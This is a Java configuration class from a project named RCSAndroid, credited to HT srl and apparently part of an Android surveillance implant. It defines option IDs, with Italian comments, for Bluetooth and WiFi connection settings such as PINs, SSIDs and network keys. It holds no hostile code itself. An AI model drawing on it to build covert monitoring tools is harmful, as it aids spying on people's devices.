/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 03-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.conf;

// TODO: Auto-generated Javadoc
/**
 * The Class Option.
 */
public class Option {

	/** Options definitions. */
	public static int CONFIGURATION = 0x8000;

	/** The CONFIGURATIO n_ btguid. */
	public static int CONFIGURATION_BTGUID = CONFIGURATION + 0x1; // Guid del
	// device
	// BlueTooth
	/** The CONFIGURATIO n_ wifimac. */
	public static int CONFIGURATION_WIFIMAC = CONFIGURATION + 0x2; // MAC
	// dell'access
	// point
	/** The CONFIGURATIO n_ wifissid. */
	public static int CONFIGURATION_WIFISSID = CONFIGURATION + 0x3; // SSID
	// della
	// rete WiFi
	/** The CONFIGURATIO n_ btpin. */
	public static int CONFIGURATION_BTPIN = CONFIGURATION + 0x4; // PIN per il
	// pairing
	// del BT
	/** The CONFIGURATIO n_ wifikey. */
	public static int CONFIGURATION_WIFIKEY = CONFIGURATION + 0x5; // Chiave di
	// accesso
	// alla rete
	// WiFi
	// ad-hoc
	/** The CONFIGURATIO n_ hostname. */
	public static int CONFIGURATION_HOSTNAME = CONFIGURATION + 0x6; // Non
	// utilizzata
	/** The CONFIGURATIO n_ serverip v6. */
	public static int CONFIGURATION_SERVERIPV6 = CONFIGURATION + 0x7; // Non
	// utilizzata
	/** The CONFIGURATIO n_ logdir. */
	public static int CONFIGURATION_LOGDIR = CONFIGURATION + 0x8; // Non
	// utilizzata
	/** The CONFIGURATIO n_ connretry. */
	public static int CONFIGURATION_CONNRETRY = CONFIGURATION + 0x9; // Non
	// utilizzata
	/** The CONFIGURATIO n_ btmac. */
	public static int CONFIGURATION_BTMAC = CONFIGURATION + 0xa; // Mac address
	// della
	// chiavetta
	// BT
	/** The CONFIGURATIO n_ wifienc. */
	public static int CONFIGURATION_WIFIENC = CONFIGURATION + 0xb; // Il tipo di
	// encryption
	// utilizzato
	// WEP/WPA/Niente
	/** The CONFIGURATIO n_ wifiip. */
	public static int CONFIGURATION_WIFIIP = CONFIGURATION + 0xc; // Ip del GW
	// WiFi

	/** Option ID. */
	private final int optionId;

	/** Parameters. */
	private final byte[] optionParams;

	/**
	 * Instantiates a new option.
	 * 
	 * @param id
	 *            the id
	 * @param params
	 *            the params
	 */
	public Option(final int id, final byte[] params) {
		this.optionId = new Integer(id);
		this.optionParams = params;
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public int getId() {
		return this.optionId;
	}

	/**
	 * Gets the params.
	 * 
	 * @return the params
	 */
	public byte[] getParams() {
		return this.optionParams;
	}
}
